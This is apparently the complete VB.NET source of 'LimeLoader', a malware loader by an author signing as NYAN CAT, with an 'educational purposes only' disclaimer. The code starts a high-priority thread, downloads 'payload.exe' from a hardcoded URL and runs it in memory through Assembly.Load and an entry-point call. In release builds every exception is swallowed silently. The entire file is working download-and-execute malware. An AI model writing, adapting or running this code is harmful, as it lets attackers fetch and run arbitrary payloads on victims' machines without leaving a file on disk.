
'       │ Author     : NYAN CAT

'       │ Name       : LimeLoader

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program is distributed for educational purposes only.

Imports System.Net
Imports System.Threading
Imports System.Reflection

Public Class Program
    Public Shared Sub Main()
        Dim T As Thread = New Thread(New ThreadStart(AddressOf Lime.Loader))
        T.Priority = ThreadPriority.Highest
        T.IsBackground = False
        T.Start()
    End Sub
End Class

Public Class Lime
    Public Shared Sub Loader()
        GetWeb("http://127.0.0.1:80/payload.exe")
    End Sub

    Public Shared Function GetWeb(ByVal URL As String) As Byte()
        Try
            Dim WC As New WebClient
            Dim Data As Byte() = WC.DownloadData(URL)
            WC.Dispose()
            Return GetLoad(Data)
        Catch ex As Exception
#If DEBUG Then
            Throw New ArgumentException(ex.Message)
#End If
        End Try
    End Function

    Public Shared Function GetLoad(ByVal Data As Byte())
        Try
            If Data IsNot Nothing Then
                Return GetEP(Assembly.Load(Data))
            End If
        Catch ex As Exception
#If DEBUG Then
            Throw New ArgumentException(ex.Message)
#End If
        End Try
    End Function

    Public Shared Function GetEP(ByVal Data As Assembly)
        Try
            If Data IsNot Nothing Then
                If Data.EntryPoint.GetParameters().Length > 0 Then
                    Return Data.EntryPoint.Invoke(Nothing, New Object() {Nothing})
                Else
                    Return Data.EntryPoint.Invoke(Nothing, Nothing)
                End If
            End If
        Catch ex As Exception
#If DEBUG Then
            Throw New ArgumentException(ex.Message)
#End If
        End Try
    End Function
End Class